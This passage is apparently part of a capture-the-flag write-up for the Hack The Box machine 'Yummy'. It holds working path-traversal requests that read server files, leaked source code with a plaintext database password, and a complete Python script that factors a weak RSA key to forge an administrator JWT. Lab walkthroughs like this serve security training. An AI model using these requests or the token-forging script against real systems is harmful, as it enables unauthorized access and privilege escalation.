| chef     | 3wDo7gSRZIwIHRxZ! |

At last we checked the third script called `dbmonitor.sh` which was interesting. It `monitored the status` of the `database` and then `executed` some `commands` based of the `status`.

```c
GET /export/../../../../../data/scripts/dbmonitor.sh HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl81NmQ1MmRhZiIsImlhdCI6MTcyODE5NTQ5MywiZXhwIjoxNzI4MTk5MDkzLCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.CBJJq2aEeAI732WsFiMZ9qMrI38gRAf_JnEG4z0tciidHCGLLsoaIo-yHU0jece7_rPDkR_LpjlG7AbWbe5_CrWSYo9AIvSn2oS2IgPi2QZE8frsiqUSV6-REB4FeHK6mMDa0LEdhJ33Z0cVjt91WjG3N9Y3KfmJROqZc0UWCmkFoIA; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU6I0BjbC0AASZsxw.ZwItbA.4mGvjhKeFwJ8zgictkVGnO4HqI4
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=dbmonitor.sh
Content-Length: 1336
Content-Type: text/x-sh; charset=utf-8
Date: Sun, 06 Oct 2024 06:26:49 GMT
Etag: "1727364676.2020187-1336-4197388916"
Last-Modified: Thu, 26 Sep 2024 15:31:16 GMT
Server: Caddy

#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json


```

![](images/2024-10-06_17-23_80_lfi_database_check.png)

We assumed that there must be a `app.py` inside of `/opt/app/` and so we tried to read it. The `source code` showed another `endpoint` which was `/admindashboard` and also a function on how the `administrator` could perform `search queries`.

```c
GET /export/../../../../../opt/app/app.py HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl81NmQ1MmRhZiIsImlhdCI6MTcyODE5NTQ5MywiZXhwIjoxNzI4MTk5MDkzLCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.CBJJq2aEeAI732WsFiMZ9qMrI38gRAf_JnEG4z0tciidHCGLLsoaIo-yHU0jece7_rPDkR_LpjlG7AbWbe5_CrWSYo9AIvSn2oS2IgPi2QZE8frsiqUSV6-REB4FeHK6mMDa0LEdhJ33Z0cVjt91WjG3N9Y3KfmJROqZc0UWCmkFoIA; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.ZwIyWw.W4UbVUsqG8vCSSMEKb8PZAk43tE
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=app.py
Content-Length: 11979
Content-Type: text/x-python; charset=utf-8
Date: Sun, 06 Oct 2024 06:47:36 GMT
Etag: "1727272486.2910218-11979-1121455571"
Last-Modified: Wed, 25 Sep 2024 13:54:46 GMT
Server: Caddy

from flask import Flask, request, send_file, render_template, redirect, url_for, flash, jsonify, make_response
import tempfile
import os
import shutil
from datetime import datetime, timedelta, timezone
from urllib.parse import quote
from ics import Calendar, Event
from middleware.verification import verify_token
from config import signature
import pymysql.cursors
from pymysql.constants import CLIENT
import jwt
import secrets
import hashlib

app = Flask(__name__, static_url_path='/static')
temp_dir = ''
app.secret_key = secrets.token_hex(32)

db_config = {
    'host': '127.0.0.1',
    'user': 'chef',
    'password': '3wDo7gSRZIwIHRxZ!',
    'database': 'yummy_db',
    'cursorclass': pymysql.cursors.DictCursor,
    'client_flag': CLIENT.MULTI_STATEMENTS

}

access_token = ''

@app.route('/login', methods=['GET','POST'])
def login():
    global access_token
    if request.method == 'GET':
        return render_template('login.html', message=None)
    elif request.method == 'POST':
        email = request.json.get('email')
        password = request.json.get('password')
        password2 = hashlib.sha256(password.encode()).hexdigest()
        if not email or not password:
            return jsonify(message="email or password is missing"), 400

        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT * FROM users WHERE email=%s AND password=%s"
                cursor.execute(sql, (email, password2))
                user = cursor.fetchone()
                if user:
                    payload = {
                        'email': email,
                        'role': user['role_id'],
                        'iat': datetime.now(timezone.utc),
                        'exp': datetime.now(timezone.utc) + timedelta(seconds=3600),
                        'jwk':{'kty': 'RSA',"n":str(signature.n),"e":signature.e}
                    }
                    access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')

                    response = make_response(jsonify(access_token=access_token), 200)
                    response.set_cookie('X-AUTH-Token', access_token)
                    return response
                else:
                    return jsonify(message="Invalid email or password"), 401
        finally:
            connection.close()

@app.route('/logout', methods=['GET'])
def logout():
    response = make_response(redirect('/login'))
    response.set_cookie('X-AUTH-Token', '')
    return response

@app.route('/register', methods=['GET', 'POST'])
def register():
        if request.method == 'GET':
            return render_template('register.html', message=None)
        elif request.method == 'POST':
            role_id = 'customer_' + secrets.token_hex(4)
            email = request.json.get('email')
            password = hashlib.sha256(request.json.get('password').encode()).hexdigest()
            if not email or not password:
                return jsonify(error="email or password is missing"), 400
            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "SELECT * FROM users WHERE email=%s"
                    cursor.execute(sql, (email,))
                    existing_user = cursor.fetchone()
                    if existing_user:
                        return jsonify(error="Email already exists"), 400
                    else:
                        sql = "INSERT INTO users (email, password, role_id) VALUES (%s, %s, %s)"
                        cursor.execute(sql, (email, password, role_id))
                        connection.commit()
                        return jsonify(message="User registered successfully"), 201
            finally:
                connection.close()


@app.route('/', methods=['GET', 'POST'])
def index():
    return render_template('index.html')

@app.route('/book', methods=['GET', 'POST'])
def export():
    if request.method == 'POST':
        try:
            name = request.form['name']
            date = request.form['date']
            time = request.form['time']
            email = request.form['email']
            num_people = request.form['people']
            message = request.form['message']

            connection = pymysql.connect(**db_config)
            try:
                with connection.cursor() as cursor:
                    sql = "INSERT INTO appointments (appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message, role_id) VALUES (%s, %s, %s, %s, %s, %s, %s)"
                    cursor.execute(sql, (name, email, date, time, num_people, message, 'customer'))
                    connection.commit()
                    flash('Your booking request was sent. You can manage your appointment further from your account. Thank you!', 'success')  
            except Exception as e:
                print(e)
            return redirect('/#book-a-table')
        except ValueError:
            flash('Error processing your request. Please try again.', 'error')
    return render_template('index.html')


def generate_ics_file(name, date, time, email, num_people, message):
    global temp_dir
    temp_dir = tempfile.mkdtemp()
    current_date_time = datetime.now()
    formatted_date_time = current_date_time.strftime("%Y%m%d_%H%M%S")

    cal = Calendar()
    event = Event()
    
    event.name = name
    event.begin = datetime.strptime(date, "%Y-%m-%d")
    event.description = f"Email: {email}\nNumber of People: {num_people}\nMessage: {message}"
    
    cal.events.add(event)

    temp_file_path = os.path.join(temp_dir, quote('Yummy_reservation_' + formatted_date_time + '.ics'))
    with open(temp_file_path, 'w') as fp:
        fp.write(cal.serialize())

    return os.path.basename(temp_file_path)

@app.route('/export/<path:filename>')
def export_file(filename):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    filepath = os.path.join(temp_dir, filename)
    if os.path.exists(filepath):
        content = send_file(filepath, as_attachment=True)
        shutil.rmtree(temp_dir)
        return content
    else:
        shutil.rmtree(temp_dir)
        return "File not found", 404

def validate_login():
    try:
        (email, current_role), status_code = verify_token()
        if email and status_code == 200 and current_role == "administrator":
            return current_role
        elif email and status_code == 200:
            return email
        else:
            raise Exception("Invalid token")
    except Exception as e:
        return None


@app.route('/dashboard', methods=['GET', 'POST'])
def dashboard():
        validation = validate_login()
        if validation is None:
            return redirect(url_for('login'))
        elif validation == "administrator":
            return redirect(url_for('admindashboard'))
 
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
                appointments_sorted = sorted(appointments, key=lambda x: x['appointment_id'])

        finally:
            connection.close()

        return render_template('dashboard.html', appointments=appointments_sorted)

@app.route('/delete/<appointID>')
def delete_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))
    elif validation == "administrator":
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments where appointment_id= %s;"
                cursor.execute(sql, (appointID,))
                connection.commit()

                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("admindashboard"))
    else:
        connection = pymysql.connect(**db_config)
        try:
            with connection.cursor() as cursor:
                sql = "DELETE FROM appointments WHERE appointment_id = %s AND appointment_email = %s;"
                cursor.execute(sql, (appointID, validation))
                connection.commit()

                sql = "SELECT appointment_id, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s"
                cursor.execute(sql, (validation,))
                connection.commit()
                appointments = cursor.fetchall()
        finally:
            connection.close()
            flash("Reservation deleted successfully","success")
            return redirect(url_for("dashboard"))
        flash("Something went wrong!","error")
        return redirect(url_for("dashboard"))

@app.route('/reminder/<appointID>')
def reminder_file(appointID):
    validation = validate_login()
    if validation is None:
        return redirect(url_for('login'))

    connection = pymysql.connect(**db_config)
    try:
        with connection.cursor() as cursor:
            sql = "SELECT appointment_id, appointment_name, appointment_email, appointment_date, appointment_time, appointment_people, appointment_message FROM appointments WHERE appointment_email = %s AND appointment_id = %s"
            result = cursor.execute(sql, (validation, appointID))
            if result != 0:
                connection.commit()
                appointments = cursor.fetchone()
                filename = generate_ics_file(appointments['appointment_name'], appointments['appointment_date'], appointments['appointment_time'], appointments['appointment_email'], appointments['appointment_people'], appointments['appointment_message'])
                connection.close()
                flash("Reservation downloaded successfully","success")
                return redirect(url_for('export_file', filename=filename))
            else:
                flash("Something went wrong!","error")
    except:
        flash("Something went wrong!","error")
        
    return redirect(url_for("dashboard"))

@app.route('/admindashboard', methods=['GET', 'POST'])
def admindashboard():
        validation = validate_login()
        if validation != "administrator":
            return redirect(url_for('login'))
 
        try:
            connection = pymysql.connect(**db_config)
            with connection.cursor() as cursor:
                sql = "SELECT * from appointments"
                cursor.execute(sql)
                connection.commit()
                appointments = cursor.fetchall()

                search_query = request.args.get('s', '')

                # added option to order the reservations
                order_query = request.args.get('o', '')

                sql = f"SELECT * FROM appointments WHERE appointment_email LIKE %s order by appointment_date {order_query}"
                cursor.execute(sql, ('%' + search_query + '%',))
                connection.commit()
                appointments = cursor.fetchall()
            connection.close()
            
            return render_template('admindashboard.html', appointments=appointments)
        except Exception as e:
            flash(str(e), 'error')
            return render_template('admindashboard.html', appointments=appointments)



if __name__ == '__main__':
    app.run(threaded=True, debug=False, host='0.0.0.0', port=3000)

```

![](images/2024-10-06_08-48_80_lfi_apppy.png)

## Forging X-AUTH-Token

Now with the `source code` of the `application` we noticed that it used `RS256` as `algorithm` for the `JSON Web Token (JWT)`.

```c
access_token = jwt.encode(payload, signature.key.export_key(), algorithm='RS256')
```

Our member `Bushidosan` also noticed some interesting `imports` which we immediately checked for further knowledge of the application.

```c
<--- CUT FOR BREVITY --->
from middleware.verification import verify_token
from config import signature
<--- CUT FOR BREVITY --->
```

We started top-down and searched for the `verification.py` inside of `middleware`. It described how the application handled `authentication` using the `X-AUTH-Token`. It looked if the user was just a `customer` or if his `role` contained `administrator`.

```c
GET /export/../../../../../opt/app/middleware/verification.py HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl80MjQxM2U4MiIsImlhdCI6MTcyODI4NjYyMiwiZXhwIjoxNzI4MjkwMjIyLCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjE1NTM2NzYzNzE5MTA1MDcyMzA2ODg3MDI4NTY3NzkzMDQ3MDc1NzA3MjcxOTQzMTcxMjQ2OTExMTEwMTc5ODE1MDk2MTQ4MzY2ODAxMzMxNDE2MTYyOTM2MzEzNDUwOTgzODU3MDQwMTE0MTUzNzExNzI4MDE4MzA0ODczNDE0MTA1ODE1ODE0NzMyMTMxNTY1NDA4ODgxMTc2OTAyNDU2MTc5MjY5MDI2OTgwNTA4NzkxNjUyMzM2MzQ1MzU5Nzg0MzA0ODU1NzE3MTg2OTAzODgyODkxNDMzNDY3Mzg4NTYzNzYwMDE3MTY0NTE2MzEzODc1OTkzMzkyMTg5MzMzMTU2ODQyMTg3MDcxNjgwOTQ2MTkzNDM0Njg0MzM0NzE2MDU5NzcwMjU5NDcyNjIwOTM3Mjg4NDc0NyIsImUiOjY1NTM3fX0.AbR1xu3hk6SKpRS09SptcICHMKkkS8adf1Va3PNEL-l4MLhatqBocu5ZxYJDPmpeISWActcLLNjo9pH1dt7rxS1qrriqQfMuTUHRlKNjtP3Xi2a0500JLld8ZIwS0mau44JecVaz_x-zPGDdPmeQCglDMIZhg2Lsc3gI5HKOvjkIYkE; session=.eJyrVopPy0kszkgtVrKKrlZSKAFSSsWlycmpxcVKOkpBqcWpRWWJJZn5eQop-eV5OfmJKakpClAFaaU5OZVKsbU65GqMrQUAdo0urg.ZwOQ4g.LUjfpF_wSebIY1PpWUOpXtFcnvI
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=verification.py
Content-Length: 1103
Content-Type: text/x-python; charset=utf-8
Date: Mon, 07 Oct 2024 07:42:58 GMT
Etag: "1715716000.0-1103-3391821419"
Last-Modified: Tue, 14 May 2024 19:46:40 GMT
Server: Caddy

#!/usr/bin/python3

from flask import request, jsonify
import jwt
from config import signature

def verify_token():
    token = None
    if "Cookie" in request.headers:
        try:
            token = request.headers["Cookie"].split(" ")[0].split("X-AUTH-Token=")[1].replace(";", '')
        except:
            return jsonify(message="Authentication Token is missing"), 401

    if not token:
        return jsonify(message="Authentication Token is missing"), 401

    try:
        data = jwt.decode(token, signature.public_key, algorithms=["RS256"])
        current_role = data.get("role")
        email = data.get("email")
        if current_role is None or ("customer" not in current_role and "administrator" not in current_role):
            return jsonify(message="Invalid Authentication token"), 401

        return (email, current_role), 200

    except jwt.ExpiredSignatureError:
        return jsonify(message="Token has expired"), 401
    except jwt.InvalidTokenError:
        return jsonify(message="Invalid token"), 401
    except Exception as e:
        return jsonify(error=str(e)), 500

```

![](images/2024-10-07_09-46_80_lfi_verification.png)

As next step we checked the `signature.py` which contained the `custom implementation` on how the `application` created the `X-AUTH-Tokens`.

```c
GET /export/../../../../../opt/app/config/signature.py HTTP/1.1
Host: yummy.htb
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.6613.120 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://yummy.htb/dashboard
Accept-Encoding: gzip, deflate, br
Cookie: X-AUTH-Token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl80MjQxM2U4MiIsImlhdCI6MTcyODI4NjYyMiwiZXhwIjoxNzI4MjkwMjIyLCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjE1NTM2NzYzNzE5MTA1MDcyMzA2ODg3MDI4NTY3NzkzMDQ3MDc1NzA3MjcxOTQzMTcxMjQ2OTExMTEwMTc5ODE1MDk2MTQ4MzY2ODAxMzMxNDE2MTYyOTM2MzEzNDUwOTgzODU3MDQwMTE0MTUzNzExNzI4MDE4MzA0ODczNDE0MTA1ODE1ODE0NzMyMTMxNTY1NDA4ODgxMTc2OTAyNDU2MTc5MjY5MDI2OTgwNTA4NzkxNjUyMzM2MzQ1MzU5Nzg0MzA0ODU1NzE3MTg2OTAzODgyODkxNDMzNDY3Mzg4NTYzNzYwMDE3MTY0NTE2MzEzODc1OTkzMzkyMTg5MzMzMTU2ODQyMTg3MDcxNjgwOTQ2MTkzNDM0Njg0MzM0NzE2MDU5NzcwMjU5NDcyNjIwOTM3Mjg4NDc0NyIsImUiOjY1NTM3fX0.AbR1xu3hk6SKpRS09SptcICHMKkkS8adf1Va3PNEL-l4MLhatqBocu5ZxYJDPmpeISWActcLLNjo9pH1dt7rxS1qrriqQfMuTUHRlKNjtP3Xi2a0500JLld8ZIwS0mau44JecVaz_x-zPGDdPmeQCglDMIZhg2Lsc3gI5HKOvjkIYkE; session=eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlJlc2VydmF0aW9uIGRvd25sb2FkZWQgc3VjY2Vzc2Z1bGx5Il19XX0.ZwOPvg.Zc2kMxiRX2OaCuUu-Rlj_NChNIc
Connection: keep-alive


```

```c
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Disposition: attachment; filename=signature.py
Content-Length: 700
Content-Type: text/x-python; charset=utf-8
Date: Mon, 07 Oct 2024 07:40:09 GMT
Etag: "1715708065.0-700-737743715"
Last-Modified: Tue, 14 May 2024 17:34:25 GMT
Server: Caddy

#!/usr/bin/python3

from Crypto.PublicKey import RSA
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization
import sympy


# Generate RSA key pair
q = sympy.randprime(2**19, 2**20)
n = sympy.randprime(2**1023, 2**1024) * q
e = 65537
p = n // q
phi_n = (p - 1) * (q - 1)
d = pow(e, -1, phi_n)
key_data = {'n': n, 'e': e, 'd': d, 'p': p, 'q': q}
key = RSA.construct((key_data['n'], key_data['e'], key_data['d'], key_data['p'], key_data['q']))
private_key_bytes = key.export_key()

private_key = serialization.load_pem_private_key(
    private_key_bytes,
    password=None,
    backend=default_backend()
)
public_key = private_key.public_key()

```

![](images/2024-10-07_09-41_80_lfi_signature.png)

Based on the `signature.py` we asked our `AI member` to generate a very detailed `tokenmodifyer.py` script to generate valid `X-AUTH-Tokens` with the `administrator role` set.

```c
┌──(kali㉿kali)-[/media/…/HTB/Machines/Yummy/files]
└─$ cat tokenmodifyer.py 
import base64
import json
import jwt
from Crypto.PublicKey import RSA
from sympy import factorint
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import serialization

# Provided JWT token (replace "X-Token" with the actual token)
token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJjdXN0b21lcl8wNGE0NTJhOCIsImlhdCI6MTcyODIyNjkzNSwiZXhwIjoxNzI4MjMwNTM1LCJqd2siOnsia3R5IjoiUlNBIiwibiI6IjExOTY1MzY1MzE5OTk1NTQwODM5ODM4MjU0MzE1OTgwMDA2OTgyMDA2NDM2ODA0MzkyMzk0MDkxNDE1NzE1MTY3MDc3NDg3NjY3OTI2MjQ2OTI4NzA5NTk3MTkwMzg3NDgyNjQxMzkxNTQ2MjI5NjMwNTc4OTYyMTExNDIyMDk0MTEwNDc4NzY0NzgxOTk3MDg3OTgwNTc0MTM4ODM3MzMzMTgwMTQwNDQ3ODM1NzgwNzc2MzcxMzU0NjY1MTk3MTY4NzExOTYxNTI3OTE3MzY2NjU4MTM0ODA5NTM4Mjg1MTc4ODEwMzcwMTU2NDAzNDkyMDU4MzUxMzg3NzI4MTE1NjU3NzE0NzQ5MjM0OTEzMDQwMzI0NDA5MjcwMzk5NzQxNDQ4Nzk3ODY0MjE1MzI4ODQ2NzI4MjI1OSIsImUiOjY1NTM3fX0.BTv04rT4ILOZ6Uq_--RGSh7-SCysIq8mPZ-kP0yATOKitRYKl183dE9Eb_ZchopfrSxYJdSO0NcWukwjGyvBEQ7DM-xQwWt1NyABig7IbPpTdKBa99mZPyE6bHUG9_83NCCW60TgK_1bhmqXoqOyi7wQzmchg4wOq7tTcb6MziERHCw"

def apply_base64_padding(encoded_str):
    """
    Ensures the base64 string is properly padded for decoding.
    
    Parameters:
        encoded_str (str): Base64-encoded string, potentially missing padding.
    
    Returns:
        str: Properly padded base64 string.
    """
    return encoded_str + '=' * (4 - len(encoded_str) % 4)

def base64url_decode(encoded_str):
    """
    Decodes a base64url-encoded string, replacing URL-safe characters 
    with standard base64 characters and adding necessary padding.
    
    Parameters:
        encoded_str (str): Base64 URL-encoded string.
    
    Returns:
        bytes: Decoded bytes.
    """
    padded_str = apply_base64_padding(encoded_str)
    standard_base64 = padded_str.replace('-', '+').replace('_', '/')
    return base64.b64decode(standard_base64)

def decode_jwt_payload(token):
    """
    Decodes the payload of a JWT.
    
    Parameters:
        token (str): The JWT token as a string.
    
    Returns:
        dict: Decoded payload as a Python dictionary.
    """
    payload_b64 = token.split(".")[1]
    decoded_payload = base64url_decode(payload_b64).decode()
    return json.loads(decoded_payload)

def factorize_modulus(modulus):
    """
    Factorizes the RSA modulus to obtain the prime factors.
    
    Parameters:
        modulus (int): The RSA modulus 'n'.
    
    Returns:
        tuple: Prime factors (p, q).
    """
    factors = factorint(modulus)
    return tuple(factors.keys())

def reconstruct_rsa_private_key(n, e, p, q):
    """
    Rebuilds the RSA private key using modulus 'n', exponent 'e', and primes 'p' and 'q'.
    
    Parameters:
        n (int): RSA modulus.
        e (int): RSA public exponent.
        p (int): First prime factor of the modulus.
        q (int): Second prime factor of the modulus.
    
    Returns:
        bytes: PEM-encoded RSA private key.
    """
    phi_n = (p - 1) * (q - 1)
    d = pow(e, -1, phi_n)  # Calculate the private exponent
    key = RSA.construct((n, e, d, p, q))
    return key.export_key()

def load_private_key(private_key_bytes):
    """
    Loads the private key from PEM-encoded bytes.
    
    Parameters:
        private_key_bytes (bytes): PEM-encoded private key.
    
    Returns:
        RSAPrivateKey: Loaded private key object.
    """
    return serialization.load_pem_private_key(
        private_key_bytes,
        password=None,
        backend=default_backend()
    )

def modify_jwt(token, private_key):
    """
    Decodes the JWT, modifies the payload to elevate privileges, and re-signs it.
    
    Parameters:
        token (str): The original JWT token.
        private_key (RSAPrivateKey): RSA private key to sign the modified token.
    
    Returns:
        str: The newly signed JWT with the modified payload.
    """
    public_key = private_key.public_key()
    decoded_payload = jwt.decode(token, public_key, algorithms=["RS256"])
    
    # Modify the payload (e.g., elevate role)
    decoded_payload["role"] = "administrator"
    
    # Re-sign the JWT with the private key
    return jwt.encode(decoded_payload, private_key, algorithm="RS256")

# Main execution flow
if __name__ == "__main__":
    # Step 1: Decode the JWT and extract modulus 'n'
    payload = decode_jwt_payload(token)
    n = int(payload["jwk"]['n'])
    
    # Step 2: Factorize modulus 'n' to obtain primes 'p' and 'q'
    p, q = factorize_modulus(n)
    
    # Step 3: Rebuild the RSA private key using 'n', 'e', 'p', and 'q'
    e = 65537  # Standard RSA public exponent
    private_key_bytes = reconstruct_rsa_private_key(n, e, p, q)
    
    # Step 4: Load the private key
    private_key = load_private_key(private_key_bytes)
    
    # Step 5: Modify the JWT payload and re-sign it
    new_jwt = modify_jwt(token, private_key)
    
    # Output the newly signed JWT
    print(f"Modified JWT: {new_jwt}")
```

```c
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 tokenmodifyer.py 
Modified JWT: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImFzZGZAYXNkZi5sb2NhbCIsInJvbGUiOiJhZG1pbmlzdHJhdG9yIiwiaWF0IjoxNzI4MjI2OTM1LCJleHAiOjE3MjgyMzA1MzUsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiMTE5NjUzNjUzMTk5OTU1NDA4Mzk4MzgyNTQzMTU5ODAwMDY5ODIwMDY0MzY4MDQzOTIzOTQwOTE0MTU3MTUxNjcwNzc0ODc2Njc5MjYyNDY5Mjg3MDk1OTcxOTAzODc0ODI2NDEzOTE1NDYyMjk2MzA1Nzg5NjIxMTE0MjIwOTQxMTA0Nzg3NjQ3ODE5OTcwODc5ODA1NzQxMzg4MzczMzMxODAxNDA0NDc4MzU3ODA3NzYzNzEzNTQ2NjUxOTcxNjg3MTE5NjE1Mjc5MTczNjY2NTgxMzQ4MDk1MzgyODUxNzg4MTAzNzAxNTY0MDM0OTIwNTgzNTEzODc3MjgxMTU2NTc3MTQ3NDkyMzQ5MTMwNDAzMjQ0MDkyNzAzOTk3NDE0NDg3OTc4NjQyMTUzMjg4NDY3MjgyMjU5IiwiZSI6NjU1Mzd9fQ.CecALElkwNezfehzz6x_AvNo-mzwLbtBOk2Auo92SWV8yk55J5TJwxfXVmlb5vlBCxTN4fkVUjz13nH-VcbEukvRZJojs5xcZbnWRcri8SUSEpO8T8M1VBOOU-VxTJpv9T2OgGXbOIadX3QMsJKhEAHwKxLK5nomi6dImNXT4Mk_MOI
```

We replaced our token using the `Web Developer Tools` and accessed `/admindashboard` to get access to the view of the `administrator`.

![](images/2024-10-06_17-05_80_admindashboard.png)

## SQL Injection (SQLi)

